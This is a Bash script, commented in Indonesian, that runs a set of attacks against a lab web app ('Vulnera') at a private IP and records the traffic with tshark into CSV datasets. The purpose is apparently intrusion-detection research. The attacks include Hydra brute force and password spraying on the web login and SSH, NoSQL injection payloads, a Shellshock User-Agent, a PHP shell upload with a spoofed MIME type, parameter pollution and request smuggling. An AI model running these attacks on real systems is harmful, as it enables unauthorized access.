#!/bin/bash

# ==============================================================================
# SKRIP MASTER SIMULASI SERANGAN V5.1 (Output CSV Konsisten & Gabungan)
# ==============================================================================

# --- KONFIGURASI (WAJIB DIISI SEBELUM DIJALANKAN!) ---
TARGET_IP="192.168.19.130" 
COOKIE="connect.sid=s%3AOKIGpJH58leJ1wiXuwFpkRz7FWuZbFl9.QgWlVPA3D9s7WVAG0HNQhrElnNiFtvb%2BlONzpAEsLao"

# --- Variabel Global ---
TSHARK_PID=""

# --- FUNGSI-FUNGSI BANTU ---
start_tshark() {
    local pcap_file=$1
    local capture_filter=$2
    echo -e "\n[INFO] Memulai penangkapan mentah ke file: $pcap_file"
    echo "[INFO] Menggunakan filter penangkapan: $capture_filter"
    sudo tshark -i any -f "$capture_filter" -w "$pcap_file" &>/dev/null &
    TSHARK_PID=$!
    sleep 3
}

stop_tshark() {
    if [ ! -z "$TSHARK_PID" ]; then
        echo "[INFO] Menghentikan penangkapan (PID: $TSHARK_PID)..."
        sudo kill "$TSHARK_PID"; wait "$TSHARK_PID" 2>/dev/null
        TSHARK_PID=""
        echo "[INFO] Penangkapan dihentikan."
    fi
    sleep 2
}

process_http_pcap_to_csv() {
    local pcap_file=$1
    local csv_file=$2
    echo "[INFO] Memproses $pcap_file menjadi $csv_file (Format HTTP)..."
    if sudo test -f "$pcap_file" && sudo test -s "$pcap_file"; then
        sudo tshark -r "$pcap_file" -Y "http" -T fields \
        -e frame.time -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport \
        -e http.request.method -e http.request.uri -e http.request.version -e http.user_agent \
        -e http.host -e http.response.version -e http.response.code \
        -e http.response.phrase -e http.content_length \
        -E header=y -E separator=, > "$csv_file"
        
        sudo chown $USER:$USER "$csv_file"
        echo "[INFO] File CSV HTTP berhasil dibuat."
    else
        echo "[PERINGATAN] File pcap $pcap_file tidak ditemukan atau kosong."
    fi
}

# FUNGSI BARU: Untuk lalu lintas non-HTTP
process_generic_pcap_to_csv() {
    local pcap_file=$1
    local csv_file=$2
    echo "[INFO] Memproses $pcap_file menjadi $csv_file (Format Generik)..."
    if sudo test -f "$pcap_file" && sudo test -s "$pcap_file"; then
        # Ekstrak fitur TCP/IP dasar, karena tidak ada layer HTTP
        sudo tshark -r "$pcap_file" -T fields \
        -e frame.time -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport \
        -e tcp.flags -e tcp.len \
        -E header=y -E separator=, > "$csv_file"
        
        sudo chown $USER:$USER "$csv_file"
        echo "[INFO] File CSV Generik berhasil dibuat."
    else
        echo "[PERINGATAN] File pcap $pcap_file tidak ditemukan atau kosong."
    fi
}

# FUNGSI BARU: Menggabungkan file CSV HTTP
combine_http_csv_files() {
    local timestamp=$1
    local combined_file="combined_http_dataset_${timestamp}.csv"
    
    echo "=================================================="
    echo "[PROSES AKHIR] Menggabungkan semua file CSV HTTP..."
    
    # Ambil header dari file normal_traffic
    if [ -f "normal_traffic_${timestamp}.csv" ]; then
        head -n 1 "normal_traffic_${timestamp}.csv" > "$combined_file"
    else
        echo "[ERROR] File normal_traffic...csv tidak ditemukan. Penggabungan dibatalkan."
        return 1
    fi

    # Loop dan tambahkan data dari file HTTP lainnya (tanpa header)
    tail -n +2 "bruteforce_traffic_${timestamp}.csv" >> "$combined_file"
    tail -n +2 "nosqli_traffic_${timestamp}.csv" >> "$combined_file"
    tail -n +2 "protocol_manip_traffic_${timestamp}.csv" >> "$combined_file"
    
    echo "[INFO] File gabungan $combined_file berhasil dibuat."
}

# --- FUNGSI-FUNGSI SIMULASI ---
simulate_normal_traffic() {
    echo "=================================================="
    echo "[AKSI DIBUTUHKAN] Simulasi Lalu Lintas Normal (Vulnera)"
    echo "=================================================="
    echo "1. Buka browser, kunjungi http://$TARGET_IP:3000"
    echo "2. Login sebagai admin."
    echo "3. Klik menu dashboard, upload csv (tanpa upload file), dan logout."
    echo "Tekan [ENTER] jika sudah selesai..."
    read
}

simulate_brute_force() {
    echo "=================================================="
    echo "[SIMULASI] Memulai Serangan BRUTE FORCE (Vulnera)"
    echo "=================================================="
    
    # Definisikan argumen Hydra menggunakan BASH ARRAY. Ini adalah cara paling aman.
    # Setiap spasi di perintah asli menjadi elemen baru di dalam array.
    local HYDRA_ARGS=(
        "-s" "3000"
        "$TARGET_IP"
        "http-post-form"
        '/login:email=^USER^&password=^PASS^:F=email tidak ditemukan'
    )

    echo "[VAR 1/3] Classic Brute Force..."
    echo -e "admin@gmail.com" > user.txt; echo -e "password\n123456\nadmin123" > passwords.txt
    # Panggil hydra dengan array: "${HYDRA_ARGS[@]}"
    hydra -L user.txt -P passwords.txt "${HYDRA_ARGS[@]}" -t 4

    sleep 5
    echo "[VAR 2/3] Credential Stuffing..."
    echo -e "test@vulnera.com:PasswordSalah\nadmin@gmail.com:admin123" > breached_creds.txt
    hydra -C breached_creds.txt "${HYDRA_ARGS[@]}"

    echo "[VAR 3/3] Username Enumeration & Password Spraying..."
    # Buat daftar username untuk diuji
    echo -e "admin@gmail.com\nroot@vulnera.com\nsupport@vulnera.com\nuser-tidak-ada@vulnera.com" > users_to_enum.txt

    # Tahap 1: Enumeration (kita simulasikan dengan hydra, menganggap pesan "Email tidak ditemukan" adalah tanda user tidak valid, tujuannya adalah menghasilkan traffic enumeration)
    hydra -L users_to_enum.txt -p "dummy_password" $TARGET_IP -s 3000 http-post-form '/login:email=^USER^&password=^PASS^:F=Password'

    sleep 5
    # Tahap 2: Password Spraying (asumsikan kita menemukan 'admin@gmail.com' valid)
    echo -e "Password123\nWelcome123!\nQWERTY12345" > common_passwords.txt
    hydra -l "admin@gmail.com" -P common_passwords.txt $TARGET_IP -s 3000 http-post-form '/login:email=^USER^&password=^PASS^:F=email tidak ditemukan' -W 5 # -W 5: Jeda 5 detik 
}

simulate_nosql_injection() {
    echo "=================================================="
    echo "[SIMULASI] Memulai Serangan NOSQL INJECTION (Vulnera)"
    echo "=================================================="

    echo "[VAR 1/3] Injeksi Operator (\$ne)..."
    curl "http://$TARGET_IP:3000/login" -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode 'email[$ne]=a' --data-urlencode 'password[$ne]=b' > /dev/null 2>&1

    sleep 3
    echo "[VAR 2/3] Injeksi Regex (Mencari user 'a')..."
    curl "http://$TARGET_IP:3000/login" -X POST -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode 'email[$regex]=^a.*' --data-urlencode 'password[$ne]=b' > /dev/null 2>&1

    echo "[VAR 3/3] Injeksi Tipe Data (Array Bypass)..."
    # Kita harus mengirim ini sebagai JSON karena form-urlencoded tidak mendukung array kosong dengan baik
    curl "http://$TARGET_IP:3000/login" -X POST \
    -H "Content-Type: application/json" \
    -d '{"email": "admin@gmail.com", "password": []}' > /dev/null 2>&1
}

simulate_protocol_manipulation() {
    echo "=================================================="
    echo "[SIMULASI] Memulai Serangan PROTOCOL MANIPULATION (Vulnera)"
    echo "=================================================="
    
    echo "[VAR 1/5] Fuzzing Direktori & File (Pengintaian Aktif)..."
    echo -e "admin\napi\nroutes\nconfig\n.env\npackage.json\n/admin/upload" > fuzz_wordlist.txt
    ffuf -w fuzz_wordlist.txt -u http://$TARGET_IP:3000/FUZZ -fs 0 > /dev/null 2>&1

    sleep 5
    echo "[VAR 2/5] Manipulasi Header (User-Agent)..."
    curl "http://$TARGET_IP:3000/" -A "() { :;}; /bin/bash -c 'id'" > /dev/null 2>&1; sleep 0.5
    curl "http://$TARGET_IP:3000/" -A "' OR 1=1 --" > /dev/null 2>&1; sleep 0.5

    sleep 5
    echo "[VAR 3/5] Serangan File Upload (MIME Type Spoofing)..."
    echo "<?php phpinfo(); ?>" > shell.php
    curl "http://$TARGET_IP:3000/admin/upload" -X POST -H "Cookie: $COOKIE" \
    -F "file=@shell.php;type=text/csv" > /dev/null 2>&1

    # Tambahkan ini sebagai VAR 4/4 atau gantikan salah satu yang ada
    echo "[VAR 4/5] HTTP Parameter Pollution..."
    # Kita akan menargetkan halaman registrasi sebagai contoh
    curl "http://$TARGET_IP:3000/register?email=test@test.com&email=hacker@hacker.com&password=123" > /dev/null 2>&1; sleep 0.5

    # Contoh lain dengan POST data
    curl "http://$TARGET_IP:3000/login" -X POST \
    --data-urlencode "email=admin@gmail.com" \
    --data-urlencode "password=salah" \
    --data-urlencode "password=admin123" > /dev/null 2>&1

    echo "[VAR 5/5] HTTP Request Smuggling (Pattern Simulation)..."
    # Mengirim header Content-Length dan Transfer-Encoding secara bersamaan
    # Ini adalah anomali besar, meskipun payload-nya sendiri mungkin tidak berbahaya
    curl "http://$TARGET_IP:3000/" -X POST \
    -H "Host: $TARGET_IP" \
    -H "Content-Length: 4" \
    -H "Transfer-Encoding: chunked" \
    -d "1\r\nA\r\n0\r\n\r\n" > /dev/null 2>&1
}

simulate_ssh_brute_force() {
    echo "=================================================="
    echo "[SIMULASI BARU] Memulai Serangan SSH BRUTE FORCE"
    echo "=================================================="
    echo -e "root\nadmin\ncemerlang" > users_ssh.txt; echo -e "password\n123456\nadmin" > passwords_ssh.txt
    hydra -L users_ssh.txt -P passwords_ssh.txt $TARGET_IP ssh
}

# --- ALUR KERJA UTAMA (VERSI BARU) ---
main() {
    sudo ls > /dev/null # Pancing Sudo
    TIMESTAMP=$(date +"%Y%m%d-%H%M")
    echo "MEMULAI MASTER SKRIP V5.1 (Output Konsisten)..."
    echo "ID Sesi: $TIMESTAMP"
    
    local HTTP_FILTER="tcp port 3000 and host $TARGET_IP"
    local SSH_FILTER="tcp port 22 and host $TARGET_IP"

    # Skenario 1: Normal (HTTP)
    PCAP_FILE="/tmp/normal_${TIMESTAMP}.pcap"; CSV_FILE="normal_traffic_${TIMESTAMP}.csv"
    start_tshark "$PCAP_FILE" "$HTTP_FILTER"; simulate_normal_traffic; sleep 5; stop_tshark; process_http_pcap_to_csv "$PCAP_FILE" "$CSV_FILE"

    # Skenario 2: Brute Force Web (HTTP)
    PCAP_FILE="/tmp/bruteforce_${TIMESTAMP}.pcap"; CSV_FILE="bruteforce_traffic_${TIMESTAMP}.csv"
    start_tshark "$PCAP_FILE" "$HTTP_FILTER"; simulate_brute_force; sleep 5; stop_tshark; process_http_pcap_to_csv "$PCAP_FILE" "$CSV_FILE"

    # Skenario 3: NoSQL Injection (HTTP)
    PCAP_FILE="/tmp/nosqli_traffic_${TIMESTAMP}.pcap"; CSV_FILE="nosqli_traffic_${TIMESTAMP}.csv"
    start_tshark "$PCAP_FILE" "$HTTP_FILTER"; simulate_nosql_injection; sleep 5; stop_tshark; process_http_pcap_to_csv "$PCAP_FILE" "$CSV_FILE"

    # Skenario 4: Protocol Manipulation (HTTP)
    PCAP_FILE="/tmp/protocol_manip_${TIMESTAMP}.pcap"; CSV_FILE="protocol_manip_traffic_${TIMESTAMP}.csv"
    start_tshark "$PCAP_FILE" "$HTTP_FILTER"; simulate_protocol_manipulation; sleep 5; stop_tshark; process_http_pcap_to_csv "$PCAP_FILE" "$CSV_FILE"
    
    # Skenario 5: Brute Force SSH (non-HTTP)
    PCAP_FILE="/tmp/ssh_bruteforce_${TIMESTAMP}.pcap"; CSV_FILE="ssh_bruteforce_traffic_${TIMESTAMP}.csv"
    start_tshark "$PCAP_FILE" "$SSH_FILTER"; simulate_ssh_brute_force; sleep 5; stop_tshark; process_generic_pcap_to_csv "$PCAP_FILE" "$CSV_FILE"

    # Langkah Terakhir: Gabungkan file CSV HTTP
    combine_http_csv_files "$TIMESTAMP"

    echo "=================================================="
    echo "SEMUA SIMULASI SELESAI. Membersihkan file sementara..."
    rm -f user.txt passwords.txt users_spray.txt breached_creds.txt fuzz_wordlist.txt shell.php users_ssh.txt passwords_ssh.txt
    sudo rm -f /tmp/*_${TIMESTAMP}.pcap
    echo "Pembersihan selesai. File CSV telah dibuat."
    echo "=================================================="
}

# (Salin semua fungsi simulate_* dari v5.0 di sini)
main
